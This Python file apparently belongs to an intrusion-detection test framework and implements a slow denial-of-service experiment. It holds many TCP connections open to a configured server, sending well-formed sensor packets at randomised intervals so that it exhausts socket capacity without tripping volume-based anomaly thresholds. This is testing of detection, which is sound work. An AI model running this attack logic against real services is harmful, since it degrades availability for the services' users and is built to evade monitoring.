"""
=============================================================================
 slowdos_experiment.py
 Structural stub for the SlowDoS (Slow Denial-of-Service) cybersecurity experiment.
=============================================================================
"""

from core.base_experiment import BaseExperiment
import socket
import struct
import time
import random
import threading

_PACKET_FMT = "<HBBIQfffffffffffffffffffffffffff"

def _crc16_ccitt(data: bytes) -> int:
    crc = 0xFFFF
    for byte in data:
        crc ^= byte << 8
        for _ in range(8):
            if crc & 0x8000:
                crc = (crc << 1) ^ 0x1021
            else:
                crc <<= 1
            crc &= 0xFFFF
    return crc

def _build_normal_packet(seq: int, node_id: int = 1) -> bytes:
    body = struct.pack(
        _PACKET_FMT,
        0xABCD, 1, node_id, seq, int(time.time() * 1000),
        0.05, 0.03, 0.08,
        0.45, 0.38, 0.52,
        0.44, 0.37, 0.51,
        1.20, 1.05, 1.35,
       -1.10,-0.95,-1.25,
        2.30, 2.00, 2.60,
        0.12, 0.08, 0.15,
        3.10, 2.95, 3.20,
        2.67, 2.76, 2.60,
    )
    crc = _crc16_ccitt(body)
    return body + struct.pack("<H", crc)

class SlowDoSExperiment(BaseExperiment):
    """
    Evaluates the slow resource exhaustion detection capabilities of the cyber
    intrusion detection system by maintaining long-lived connections with an
    intentionally reduced transmission rate.

    This experiment uses multiple concurrent sockets to hold open connections
    while consuming the server's listening socket capacity without generating
    features that trigger volume-based anomaly thresholds.
    """

    def initialize(self) -> None:
        cfg = self.config.get("slowdrain", {})
        self.interval_sec = cfg.get("interval_sec", 20.0)
        self.target_ip = self.config.get("server_ip", "127.0.0.1")
        self.target_port = self.config.get("server_port", 9000)
        self.concurrent_sockets = cfg.get("concurrent_sockets", 10)
        
        self.sent = 0
        self.errors = 0
        self.sockets = []
        self.lock = threading.Lock()
        self._log_initialized()

    def _slow_drain_worker(self, worker_id: int, attack_duration: float):
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5.0)
            sock.connect((self.target_ip, self.target_port))
            sock.settimeout(self.interval_sec + 10.0)
            with self.lock:
                self.sockets.append(sock)
            self.logger.info(f"[{self.name}-W{worker_id}] Connected.")
        except Exception as e:
            self.logger.error(f"[{self.name}-W{worker_id}] Cannot connect: {e}")
            return

        deadline = time.time() + attack_duration
        seq = 0
        
        while time.time() < deadline:
            pkt = _build_normal_packet(seq)
            try:
                sock.sendall(pkt)
                try:
                    ack = sock.recv(1)
                except socket.timeout:
                    pass

                with self.lock:
                    self.sent += 1
                seq += 1
            except Exception as e:
                with self.lock:
                    self.errors += 1
                self.logger.error(f"[{self.name}-W{worker_id}] Send error: {e}")
                try:
                    if sock:
                        sock.close()
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5.0)
                    sock.connect((self.target_ip, self.target_port))
                    sock.settimeout(self.interval_sec + 10.0)
                    with self.lock:
                        self.sockets.append(sock)
                except Exception:
                    break

            remaining = deadline - time.time()
            if remaining <= 0:
                break
            
            # Randomize delay between 5s and 25s for realistic jitter
            current_interval = random.uniform(5.0, 25.0)
            sleep_time = min(current_interval, remaining)
            time.sleep(sleep_time)

    def run(self) -> None:
        self._log_started()
        
        pre_attack = self.experiment_config.get("pre_attack_duration", 5.0)
        self.logger.info(f"[{self.name}] Observing pre-attack baseline for {pre_attack}s...")
        time.sleep(pre_attack)

        attack_duration = self.experiment_config.get("attack_duration", 60.0)
        self.logger.info(f"[{self.name}] SLOW DRAIN ATTACK — {self.concurrent_sockets} concurrent sockets against {self.target_ip}:{self.target_port}")
        
        threads = []
        for i in range(self.concurrent_sockets):
            t = threading.Thread(target=self._slow_drain_worker, args=(i, attack_duration))
            t.daemon = True  # Ensures threads die if main program aborts
            threads.append(t)
            t.start()
            # Stagger connections slightly so they don't all hit the server at the exact same millisecond
            time.sleep(0.1)
            
        # Use a timeout in join to ensure Ctrl+C (KeyboardInterrupt) can be caught during the 1.5 hours
        for t in threads:
            while t.is_alive():
                t.join(1.0)
        
        post_attack = self.experiment_config.get("post_attack_duration", 5.0)
        self.logger.info(f"[{self.name}] Observing post-attack baseline for {post_attack}s...")
        time.sleep(post_attack)
        
        self._log_completed()

    def cleanup(self) -> None:
        with self.lock:
            for sock in self.sockets:
                try:
                    sock.close()
                except:
                    pass
        self.logger.info(f"[{self.name}] Slow drain complete: {self.sent} packets sent, {self.errors} errors.")
        self._log_cleaned_up()
